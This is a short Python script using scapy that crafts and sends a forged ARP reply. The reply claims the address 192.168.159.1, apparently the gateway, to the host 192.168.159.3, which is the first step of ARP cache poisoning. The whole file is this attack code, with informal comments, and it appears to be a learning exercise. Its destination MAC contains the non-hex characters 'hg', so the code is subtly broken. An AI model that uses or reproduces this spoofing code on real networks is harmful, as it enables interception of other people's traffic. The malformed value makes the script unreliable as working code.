#!/usr/bin/env python

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="192.168.159.3", hwdst="ff:65:46:ff:hg:dd", psrc="192.168.159.1") #  this is set arp class

print(packet.show()) ## show the field you are setup.
print(packet.summary()) # this is showing packet summary
scapy.send(packet) ## this is send scapy packets.

